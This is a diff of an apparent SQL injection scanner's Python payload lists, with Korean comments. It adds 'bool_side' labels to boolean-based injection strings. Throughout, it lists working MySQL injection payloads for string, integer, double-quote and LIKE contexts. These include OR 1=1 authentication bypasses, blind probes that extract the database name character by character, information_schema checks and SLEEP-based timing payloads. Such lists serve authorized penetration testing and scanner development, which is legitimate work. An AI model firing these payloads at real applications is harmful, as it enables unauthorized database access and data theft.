@@ -67,31 +67,31 @@ ERROR_BASED_NUMERIC: List[Payload] = [
 
 #  Boolean-based (문자열 컨텍스트) 
 BOOLEAN_STRING: List[Payload] = [
-    {"type": "BOOLEAN", "family": "or_true",           "payload": "' OR '1'='1"},
-    {"type": "BOOLEAN", "family": "or_true_comment",   "payload": "' OR 1=1-- -"},
-    {"type": "BOOLEAN", "family": "and_false",         "payload": "' AND '1'='2'-- -"},
-    {"type": "BOOLEAN", "family": "and_true",          "payload": "' AND '1'='1'-- -"},
-    {"type": "BOOLEAN", "family": "ascii_gt",          "payload": "' AND ASCII(SUBSTRING(database(),1,1))>64-- -"},
-    {"type": "BOOLEAN", "family": "ascii_eq",          "payload": "' AND ASCII(SUBSTRING(database(),1,1))=97-- -"},
-    {"type": "BOOLEAN", "family": "length_db",         "payload": "' AND LENGTH(database())>1-- -"},
-    {"type": "BOOLEAN", "family": "length_db_eq",      "payload": "' AND LENGTH(database())=6-- -"},
-    {"type": "BOOLEAN", "family": "substr_a",          "payload": "' AND SUBSTRING(database(),1,1)='a'-- -"},
-    {"type": "BOOLEAN", "family": "exists_tables",     "payload": "' AND EXISTS(SELECT * FROM information_schema.tables)-- -"},
-    {"type": "BOOLEAN", "family": "case_true",         "payload": "' AND CASE WHEN (1=1) THEN 1 ELSE 0 END-- -"},
-    {"type": "BOOLEAN", "family": "case_db_len",       "payload": "' AND CASE WHEN (LENGTH(database())>0) THEN 1 ELSE 0 END-- -"},
-    {"type": "BOOLEAN", "family": "mid_regexp",        "payload": "' AND MID(database(),1,1) REGEXP '^[a-z]'-- -"},
-    {"type": "BOOLEAN", "family": "like_wildcard",     "payload": "' AND database() LIKE '%'-- -"},
-    {"type": "BOOLEAN", "family": "in_subquery",       "payload": "' AND 1 IN (SELECT 1 FROM information_schema.tables LIMIT 1)-- -"},
+    {"type": "BOOLEAN", "family": "or_true",           "bool_side": "true",  "payload": "' OR '1'='1"},
+    {"type": "BOOLEAN", "family": "or_true_comment",   "bool_side": "true",  "payload": "' OR 1=1-- -"},
+    {"type": "BOOLEAN", "family": "and_false",         "bool_side": "false", "payload": "' AND '1'='2'-- -"},
+    {"type": "BOOLEAN", "family": "and_true",          "bool_side": "true",  "payload": "' AND '1'='1'-- -"},
+    {"type": "BOOLEAN", "family": "ascii_gt",          "bool_side": "probe", "payload": "' AND ASCII(SUBSTRING(database(),1,1))>64-- -"},
+    {"type": "BOOLEAN", "family": "ascii_eq",          "bool_side": "probe", "payload": "' AND ASCII(SUBSTRING(database(),1,1))=97-- -"},
+    {"type": "BOOLEAN", "family": "length_db",         "bool_side": "probe", "payload": "' AND LENGTH(database())>1-- -"},
+    {"type": "BOOLEAN", "family": "length_db_eq",      "bool_side": "probe", "payload": "' AND LENGTH(database())=6-- -"},
+    {"type": "BOOLEAN", "family": "substr_a",          "bool_side": "probe", "payload": "' AND SUBSTRING(database(),1,1)='a'-- -"},
+    {"type": "BOOLEAN", "family": "exists_tables",     "bool_side": "true",  "payload": "' AND EXISTS(SELECT * FROM information_schema.tables)-- -"},
+    {"type": "BOOLEAN", "family": "case_true",         "bool_side": "true",  "payload": "' AND CASE WHEN (1=1) THEN 1 ELSE 0 END-- -"},
+    {"type": "BOOLEAN", "family": "case_db_len",       "bool_side": "probe", "payload": "' AND CASE WHEN (LENGTH(database())>0) THEN 1 ELSE 0 END-- -"},
+    {"type": "BOOLEAN", "family": "mid_regexp",        "bool_side": "probe", "payload": "' AND MID(database(),1,1) REGEXP '^[a-z]'-- -"},
+    {"type": "BOOLEAN", "family": "like_wildcard",     "bool_side": "true",  "payload": "' AND database() LIKE '%'-- -"},
+    {"type": "BOOLEAN", "family": "in_subquery",       "bool_side": "true",  "payload": "' AND 1 IN (SELECT 1 FROM information_schema.tables LIMIT 1)-- -"},
 ]
 
 #  Boolean-based (숫자 컨텍스트) 
 BOOLEAN_NUMERIC: List[Payload] = [
-    {"type": "BOOLEAN", "family": "num_or_true",       "payload": "0 OR 1=1"},
-    {"type": "BOOLEAN", "family": "num_and_false",     "payload": "1 AND 1=2"},
-    {"type": "BOOLEAN", "family": "num_ascii",         "payload": "0 OR ASCII(SUBSTRING(database(),1,1))>64"},
-    {"type": "BOOLEAN", "family": "num_length",        "payload": "0 OR LENGTH(database())>1"},
-    {"type": "BOOLEAN", "family": "num_case",          "payload": "0 OR CASE WHEN (1=1) THEN 1 ELSE 0 END"},
-    {"type": "BOOLEAN", "family": "num_exists",        "payload": "0 OR EXISTS(SELECT * FROM information_schema.tables)"},
+    {"type": "BOOLEAN", "family": "num_or_true",       "bool_side": "true",  "payload": "0 OR 1=1"},
+    {"type": "BOOLEAN", "family": "num_and_false",     "bool_side": "false", "payload": "1 AND 1=2"},
+    {"type": "BOOLEAN", "family": "num_ascii",         "bool_side": "probe", "payload": "0 OR ASCII(SUBSTRING(database(),1,1))>64"},
+    {"type": "BOOLEAN", "family": "num_length",        "bool_side": "probe", "payload": "0 OR LENGTH(database())>1"},
+    {"type": "BOOLEAN", "family": "num_case",          "bool_side": "true",  "payload": "0 OR CASE WHEN (1=1) THEN 1 ELSE 0 END"},
+    {"type": "BOOLEAN", "family": "num_exists",        "bool_side": "true",  "payload": "0 OR EXISTS(SELECT * FROM information_schema.tables)"},
 ]
 
 #  Time-based (문자열 컨텍스트) 
@@ -281,43 +281,43 @@ BLIND_SQLI: Dict[str, List[Payload]] = {
 
     # 싱글쿼트 문자열 컨텍스트 (WHERE col = 'INJECT')
     "string_sq": [
-        {"type": "BOOLEAN",    "family": "and_true",    "payload": "test' AND '1'='1' -- "},
-        {"type": "BOOLEAN",    "family": "and_false",   "payload": "test' AND '1'='2' -- "},
-        {"type": "BOOLEAN",    "family": "subq_tables", "payload": "test' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1 -- "},
-        {"type": "BOOLEAN",    "family": "db_len",      "payload": "test' AND LENGTH(database())>0 -- "},
-        {"type": "BOOLEAN",    "family": "db_char",     "payload": "test' AND SUBSTR(database(),1,1)>'a' -- "},
+        {"type": "BOOLEAN",    "family": "and_true",    "bool_side": "true",  "payload": "test' AND '1'='1' -- "},
+        {"type": "BOOLEAN",    "family": "and_false",   "bool_side": "false", "payload": "test' AND '1'='2' -- "},
+        {"type": "BOOLEAN",    "family": "subq_tables", "bool_side": "true",  "payload": "test' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1 -- "},
+        {"type": "BOOLEAN",    "family": "db_len",      "bool_side": "probe", "payload": "test' AND LENGTH(database())>0 -- "},
+        {"type": "BOOLEAN",    "family": "db_char",     "bool_side": "probe", "payload": "test' AND SUBSTR(database(),1,1)>'a' -- "},
         {"type": "TIME_BASED", "family": "and_sleep",   "payload": "test' AND 0 IN (SELECT SLEEP(5)) -- "},
         {"type": "TIME_BASED", "family": "if_sleep",    "payload": "test' AND IF(1=1,SLEEP(5),0) -- "},
     ],
 
     # 정수형 컨텍스트 (WHERE id = INJECT)
     "integer": [
-        {"type": "BOOLEAN",    "family": "and_true",    "payload": "1 AND 1=1-- -"},
-        {"type": "BOOLEAN",    "family": "and_false",   "payload": "1 AND 1=2-- -"},
-        {"type": "BOOLEAN",    "family": "subq_tables", "payload": "1 AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1-- -"},
-        {"type": "BOOLEAN",    "family": "db_len",      "payload": "1 AND LENGTH(database())>0-- -"},
-        {"type": "BOOLEAN",    "family": "db_char",     "payload": "1 AND SUBSTR(database(),1,1)>'a'-- -"},
+        {"type": "BOOLEAN",    "family": "and_true",    "bool_side": "true",  "payload": "1 AND 1=1-- -"},
+        {"type": "BOOLEAN",    "family": "and_false",   "bool_side": "false", "payload": "1 AND 1=2-- -"},
+        {"type": "BOOLEAN",    "family": "subq_tables", "bool_side": "true",  "payload": "1 AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1-- -"},
+        {"type": "BOOLEAN",    "family": "db_len",      "bool_side": "probe", "payload": "1 AND LENGTH(database())>0-- -"},
+        {"type": "BOOLEAN",    "family": "db_char",     "bool_side": "probe", "payload": "1 AND SUBSTR(database(),1,1)>'a'-- -"},
         {"type": "TIME_BASED", "family": "and_sleep",   "payload": "1 AND 0 IN (SELECT SLEEP(5))-- -"},
         {"type": "TIME_BASED", "family": "if_sleep",    "payload": "1 AND IF(1=1,SLEEP(5),0)-- -"},
     ],
 
     # 더블쿼트 문자열 컨텍스트 (WHERE col = "INJECT")
     "string_dq": [
-        {"type": "BOOLEAN",    "family": "and_true",    "payload": 'val" AND "1"="1" -- '},
-        {"type": "BOOLEAN",    "family": "and_false",   "payload": 'val" AND "1"="2" -- '},
-        {"type": "BOOLEAN",    "family": "subq_tables", "payload": 'val" AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1 -- '},
-        {"type": "BOOLEAN",    "family": "db_len",      "payload": 'val" AND LENGTH(database())>0 -- '},
+        {"type": "BOOLEAN",    "family": "and_true",    "bool_side": "true",  "payload": 'val" AND "1"="1" -- '},
+        {"type": "BOOLEAN",    "family": "and_false",   "bool_side": "false", "payload": 'val" AND "1"="2" -- '},
+        {"type": "BOOLEAN",    "family": "subq_tables", "bool_side": "true",  "payload": 'val" AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1 -- '},
+        {"type": "BOOLEAN",    "family": "db_len",      "bool_side": "probe", "payload": 'val" AND LENGTH(database())>0 -- '},
         {"type": "TIME_BASED", "family": "and_sleep",   "payload": 'val" AND 0 IN (SELECT SLEEP(5)) -- '},
         {"type": "TIME_BASED", "family": "if_sleep",    "payload": 'val" AND IF(1=1,SLEEP(5),0) -- '},
     ],
 
     # LIKE 절 + 괄호 닫기 컨텍스트 (WHERE (col LIKE '%INJECT%'))
     "like_string": [
-        {"type": "BOOLEAN",    "family": "paren_true",        "payload": "%' AND 1=1)-- -"},
-        {"type": "BOOLEAN",    "family": "paren_false",       "payload": "%' AND 1=2)-- -"},
-        {"type": "BOOLEAN",    "family": "paren_subq_tables", "payload": "%' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1)-- -"},
-        {"type": "BOOLEAN",    "family": "paren_db_len",      "payload": "%' AND LENGTH(database())>0)-- -"},
-        {"type": "BOOLEAN",    "family": "paren_db_char",     "payload": "%' AND SUBSTR(database(),1,1)>'a')-- -"},
+        {"type": "BOOLEAN",    "family": "paren_true",        "bool_side": "true",  "payload": "%' AND 1=1)-- -"},
+        {"type": "BOOLEAN",    "family": "paren_false",       "bool_side": "false", "payload": "%' AND 1=2)-- -"},
+        {"type": "BOOLEAN",    "family": "paren_subq_tables", "bool_side": "true",  "payload": "%' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1)-- -"},
+        {"type": "BOOLEAN",    "family": "paren_db_len",      "bool_side": "probe", "payload": "%' AND LENGTH(database())>0)-- -"},
+        {"type": "BOOLEAN",    "family": "paren_db_char",     "bool_side": "probe", "payload": "%' AND SUBSTR(database(),1,1)>'a')-- -"},
         {"type": "TIME_BASED", "family": "paren_sleep",       "payload": "%') AND SLEEP(5)-- -"},
         {"type": "TIME_BASED", "family": "if_sleep",          "payload": "%' AND IF(1=1,SLEEP(5),0))-- -"},
         {"type": "TIME_BASED", "family": "and_sleep",         "payload": "%' AND 0 IN (SELECT SLEEP(5)) -- -"},
